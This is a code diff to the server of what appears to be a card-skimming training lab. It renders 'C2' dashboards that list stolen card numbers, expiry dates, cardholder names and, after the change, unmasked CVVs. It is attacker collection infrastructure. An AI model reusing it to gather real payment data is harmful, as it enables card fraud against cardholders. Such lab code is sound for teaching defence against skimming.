@@ -67,8 +67,8 @@ Object.values(DATA_DIRS).forEach(dir => {
 function maskCardNumber(cardNumber) {
   if (!cardNumber) return 'N/A'
   const clean = cardNumber.replace(/[\s-]/g, '')
-  if (clean.length < 10) return '****'
-  return clean.slice(0, 6) + '******' + clean.slice(-4)
+  if (clean.length < 8) return '****'
+  return clean.slice(0, 4) + '*'.repeat(clean.length - 8) + clean.slice(-4)
 }
 
 function sanitizeForLog(input) {
@@ -247,11 +247,11 @@ function generateLab1Dashboard(records) {
       ? '<span style="color:green">✅ VALID</span>'
       : '<span style="color:orange">⚠️ INCOMPLETE</span>'
     return `
-      <div style="border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:5px;background:${validation.valid ? '#2a4a2a' : '#4a3a2a'};color:#0f0">
+      <div class="stolen-record" style="border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:5px;background:${validation.valid ? '#2a4a2a' : '#4a3a2a'};color:#0f0">
         <h3>Record #${index + 1} ${badge}</h3>
         <p><strong>Received:</strong> ${record.server?.receivedAt || 'Unknown'}</p>
         <p><strong>Card:</strong> ${maskCardNumber(record.cardNumber)}</p>
-        <p><strong>CVV:</strong> ${record.cvv ? '***' : 'N/A'}</p>
+        <p><strong>CVV:</strong> ${record.cvv || 'N/A'}</p>
         <p><strong>Expiry:</strong> ${record.expiry || 'N/A'}</p>
         <p><strong>Cardholder:</strong> ${record.cardholderName || 'N/A'}</p>
         <p><strong>Email:</strong> ${record.email || 'N/A'}</p>
@@ -272,11 +272,13 @@ function generateLab1Dashboard(records) {
     <div class="c2-nav"><a href="/lab1">← Back to Lab</a><a href="/">Home</a></div>
     <nav><a href="/lab1/c2/">Dashboard</a><a href="/lab1/c2/api/stolen">JSON API</a><a href="/lab1/c2/stats">Stats</a><a href="/lab1/c2/health">Health</a></nav>
     <div class="stats"><h2>Statistics</h2>
-      <p><strong>Total Records:</strong> ${records.length}</p>
+      <p><strong>Total Records:</strong> <span id="totalRecords">${records.length}</span></p>
       <p><strong>Valid Cards:</strong> ${records.filter(r => r.validation?.valid).length}</p>
     </div>
     <h2>Stolen Credit Card Data</h2>
+    <div id="stolenData">
     ${records.length === 0 ? '<p>No data collected yet.</p>' : recordsHtml}
+    </div>
   </body></html>`
 }
 
@@ -483,17 +485,15 @@ function generateLab2Dashboard(records) {
 
   const submissionRows = submissions.slice().reverse().map((r, i) => {
     const card = extractCardFields(r.formData)
-    const masked = card.cardNumber
-      ? card.cardNumber.replace(/[\s-]/g, '').replace(/^(.{6})(.+)(.{4})$/, (_, a, m, b) => a + '*'.repeat(m.length) + b)
-      : 'N/A'
+    const masked = maskCardNumber(card.cardNumber)
     return `
-      <div style="border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:5px;background:#1e2e1e;color:#0f0">
+      <div class="attack-record" style="border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:5px;background:#1e2e1e;color:#0f0">
         <h3>Capture #${i + 1} <span style="color:#0c0">✅ FORM SUBMIT</span></h3>
         <p><strong>Received:</strong> ${r.serverTime || 'unknown'}</p>
         <p><strong>Card Number:</strong> ${masked}</p>
         <p><strong>Cardholder:</strong> ${card.name || 'N/A'}</p>
         <p><strong>Expiry:</strong> ${card.expiry || 'N/A'}</p>
-        <p><strong>CVV:</strong> ${card.cvv ? '***' : 'N/A'}</p>
+        <p><strong>CVV:</strong> ${card.cvv || 'N/A'}</p>
         <p><strong>ZIP:</strong> ${card.zip || 'N/A'}</p>
         <p><strong>Form:</strong> ${r.formId || 'N/A'}</p>
       </div>`
@@ -512,12 +512,14 @@ function generateLab2Dashboard(records) {
     <div class="c2-nav"><a href="/lab2">← Back to Lab</a><a href="/">Home</a></div>
     <nav><a href="/lab2/c2/">Dashboard</a><a href="/lab2/c2/api/stolen">JSON API</a><a href="/lab2/c2/stats">Stats</a><a href="/lab2/c2/health">Health</a></nav>
     <div class="stats"><h2>Statistics</h2>
+      <p><strong>Total Attacks:</strong> <span id="totalAttacks">${submissions.length}</span></p>
       <p><strong>Total Records:</strong> ${records.length}</p>
-      <p><strong>Form Submissions (card captures):</strong> ${submissions.length}</p>
       ${Object.entries(attackCounts).map(([t, n]) => `<p><strong>${t}:</strong> ${n}</p>`).join('')}
     </div>
     <h2>Captured Card Data</h2>
+    <div id="recentData">
     ${submissions.length === 0 ? '<p>No form submissions captured yet. Submit the banking form to see card data here.</p>' : submissionRows}
+    </div>
     ${other.length > 0 ? `<h2>Other Events (${other.length})</h2>
     <table><tr><th>#</th><th>Time</th><th>Type</th><th>Severity</th></tr>
     ${other.slice(-10).reverse().map((r, i) => `<tr><td>${i + 1}</td><td>${r.serverTime || 'unknown'}</td><td>${r.type || 'unknown'}</td><td>${r.severity || 'N/A'}</td></tr>`).join('')}
